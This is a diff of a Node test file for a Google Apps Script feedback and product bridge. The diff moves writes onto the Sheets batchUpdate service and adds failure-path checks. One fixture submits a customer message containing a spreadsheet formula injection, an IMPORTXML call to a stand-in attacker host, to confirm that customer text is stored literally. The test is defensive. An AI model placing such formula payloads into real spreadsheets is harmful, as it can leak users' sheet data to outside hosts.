@@ -6,7 +6,7 @@ import { readFile } from 'node:fs/promises';
 
 const source = await readFile(new URL('../google-apps-script/Code.gs', import.meta.url), 'utf8');
 test('Apps Script writes matching columns and durable retry log atomically, with literal customer text', () => {
-  const secret = 'private-bridge-secret-with-more-than-32-characters'; let batch, duplicate = false;
+  const secret = 'private-bridge-secret-with-more-than-32-characters'; let batch, duplicate = false, failSave = false;
   const properties = new Map([['BRIDGE_SECRET', secret]]);
   const ctx = {
     ContentService: { MimeType: { JSON: 'json' }, createTextOutput: value => ({ value, setMimeType() { return this; } }) },
@@ -14,13 +14,18 @@ test('Apps Script writes matching columns and durable retry log atomically, with
     PropertiesService: { getScriptProperties: () => ({ getProperty: key => properties.get(key) }) },
     LockService: { getScriptLock: () => ({ waitLock() {}, hasLock: () => true, releaseLock() {} }) },
     SpreadsheetApp: { openById: () => ({ getSheetByName: () => ({ getSheetId: () => 999, getRange: () => ({ createTextFinder: () => ({ matchEntireCell() { return this; }, findNext: () => duplicate }) }) }) }) },
-    ScriptApp: { getOAuthToken: () => 'google-test-token' },
-    UrlFetchApp: { fetch: (url, options) => { batch = JSON.parse(options.payload); duplicate = true; return { getResponseCode: () => 200, getContentText: () => '{}' }; } }, console
+    Sheets: { Spreadsheets: { batchUpdate: (request, id) => { assert.equal(id, '18j6KNPxLlEoiuBScGOdcopDwFrpwhmNrmC9xSlNx6tI'); assert.ok(request.requests.length > 0); if (failSave) throw new Error('Test Sheets write failure'); batch = request; duplicate = true; return {}; } } },
+    UrlFetchApp: { fetch: () => { throw new Error('Feedback without pictures must use the authorized Sheets service.'); } }, console
   };
   vm.createContext(ctx); vm.runInContext(source, ctx);
   const value = { secret, id: '12345678-1234-1234-1234-123456789abc', type:'Make a complaint', customer:'Yes', topic:'Other', message:'=IMPORTXML("https://attacker.example")', phone:'', pictures:[] };
   const submit = data => JSON.parse(ctx.doPost({postData:{contents:JSON.stringify(data)}}).value);
-  assert.equal(submit({...value,secret:'wrong'}).ok, false); assert.equal(batch, undefined);
+  const unauthorized = submit({...value,secret:'wrong'});
+  assert.equal(unauthorized.ok, false); assert.equal(unauthorized.detail, undefined); assert.equal(batch, undefined);
+  failSave = true;
+  const failed = submit(value);
+  assert.equal(failed.ok, false); assert.equal(failed.detail, 'Test Sheets write failure'); assert.equal(batch, undefined);
+  failSave = false;
   assert.equal(submit(value).ok, true); assert.equal(batch.requests.length, 2);
   const row = batch.requests[0].appendCells;
   assert.equal(row.sheetId, 763732222); assert.equal(row.rows[0].values.length, 7);
@@ -34,13 +39,14 @@ test('Apps Script preserves product edits, rejects stale saves and can remove al
     Utilities: { DigestAlgorithm: { SHA_256: 'sha256' }, computeDigest: (_algorithm, value) => [...createHash('sha256').update(value).digest()] },
     PropertiesService: { getScriptProperties: () => ({ getProperty: () => 'true' }) },
     SpreadsheetApp: { openById: () => ({ getSheetByName: () => ({ getSheetId: () => 999, getLastRow: () => rows.length + 1, getRange: () => ({ getValues: () => rows }) }) }) },
-    ScriptApp: { getOAuthToken: () => 'test-token' },
-    UrlFetchApp: { fetch: (_url, options) => {
-      const batch = JSON.parse(options.payload); const update = batch.requests[0].updateCells;
+    Sheets: { Spreadsheets: { batchUpdate: (batch, id) => {
+      assert.equal(id, '18j6KNPxLlEoiuBScGOdcopDwFrpwhmNrmC9xSlNx6tI');
+      const update = batch.requests[0].updateCells;
       assert.equal(update.range.startRowIndex, 1);
       rows = update.rows.map(row => row.values.map(cell => cell.userEnteredValue.stringValue));
-      return { getResponseCode: () => 200, getContentText: () => '{}' };
-    } }, console
+      return {};
+    } } },
+    UrlFetchApp: { fetch: () => { throw new Error('Product writes must use the authorized Sheets service.'); } }, console
   };
   vm.createContext(ctx); vm.runInContext(source, ctx);
   const lock = { waitLock() {} };
